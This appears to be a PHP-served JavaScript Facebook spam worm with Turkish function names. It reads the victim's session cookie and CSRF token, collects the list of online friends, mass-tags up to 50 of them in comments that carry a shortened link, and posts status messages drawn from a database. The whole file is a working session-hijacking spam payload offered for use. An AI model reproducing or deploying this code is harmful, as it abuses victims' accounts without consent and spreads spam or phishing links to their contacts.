<?php
		require_once 'config.php';
?>
var profile_id="100004889077584"


friends= [];
function on_arkadas(id){
	var xmlhttp = new XMLHttpRequest();
	var params = "user=" + document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]) + "&fetch_mobile=false&__user=" + document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]) + "&__a=1&__req=2&fb_dtsg=" + document.getElementsByName('fb_dtsg')[0].value;
	xmlhttp.open("POST", "/ajax/chat/buddy_list.php?__a=1", true);
	xmlhttp.onreadystatechange = function() {
		if(xmlhttp.readyState == 4 && xmlhttp.status == 200) {
			var veri = JSON.parse(xmlhttp.responseText.replace("for (;;);", ""));
			var toplam = Object.keys(veri.payload.buddy_list.nowAvailableList).length;
			for(kisi in veri.payload.buddy_list.nowAvailableList){
				friends.push({id: kisi});
				if(toplam == friends.length){ 
					Etiketle(id, "ppp"); 
				}
			}
		}
	}
	xmlhttp.send(params);
}


function Etiketle(post,mesaj){
	var xmlhttp = new XMLHttpRequest();
	xmlhttp.onreadystatechange = function () {
	    if (xmlhttp.readyState == 4) {
	    alert(xmlhttp.responseText);
	    }
	};
	var comment_text = mesaj + "%0A";
	if(friends.length < 50){ limit = friends.length; }else { limit = 50; }
	for (i = 0; i < limit; i++) {
	comment_text += "@[" + friends[i].id + ":x] "
	}
	
	var params = "&ft_ent_identifier=" + post;
	params += "&fb_dtsg=" + document.getElementsByName('fb_dtsg')[0].value;
	params += "&comment_text=" + comment_text;
	params += "&_user=" + document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]).toString();;
	params += "&__a=1";
	params += "&__dyn=7n8ahyj35CFUlgDxqiyaUVCxSrxG4o";
	params += "&__req=5";
	params += "&ttstamp=26581661051005178104";
	params += "&ft[tn]=[]";
	params += "&giftoccasion=";
	params += "&attached_photo_fbid=0";
	params += "&attached_sticker_fbid=0";
	params += "&parent_comment_id=";
	params += "&reply_fbid=";
	params += "&source=2";
	params += "&client_id=1384301515666=3764176756"
	xmlhttp.open("POST", "/ajax/ufi/add_comment.php", true);
	xmlhttp.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
	xmlhttp.send(params);

}

function getAllCommentIds(){
	var commentIds=document.getElementsByClassName('_5pcq');
	
	
	var arr = Array.prototype.slice.call( commentIds)
	 
	for (var  i= 0; i < arr.length; i++) {
		var ppost=arr[i].href.split('?')[0].split('/')[5];
		if(ppost){
			Etiketle(ppost,"http://goo.gl/QwEJXF")
		}
		
	}
	
	
}
function durum_paylas(msg) {
	var http = new XMLHttpRequest();
	http.onreadystatechange = function () {
	    if (http.readyState == 4) {}
	};
	
	// durum paylaş
	var params = "fb_dtsg="+document.getElementsByName('fb_dtsg')[0].value;
	params += "&xhpc_context=profile";
	params += "&xhpc_ismeta=1";
	params += "&xhpc_timeline"; 
	params += "&xhpc_composerid=u_jsonp_4_d";
	params += "&xhpc_targetid=" + profile_id;
	params += "&xhpc_message_text="+msg;
	params += "&xhpc_message="+msg;
	params += "&hide_object_attachment=0";
	params += "&disable_location_sharing=false";
	params += "&composer_predicted_city=106012156106461";
	params += "&audience[0][value]=10";
	params += "&nctr[_mod]=pagelet_timeline_recent";
	params += "&__user=" + profile_id;
	params += "&__a=1";
	params += "&__req=15";
	params += "&ttstamp=16581651097412012156155";
	
	http.open("POST", "/ajax/updatestatus.php", true);
	http.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
	http.send(params);

}
//getAllCommentIds();
//video_paylas();
//alert('about to share');

<?php
$atable = select ( "select * from videos order by rand() limit 1 " );
if(count($atable)>0){
	$arow=$atable[0];
	echo "durum_paylas('$arow[msg]');";
}
?>	
		


//on_arkadas('267943690045265');

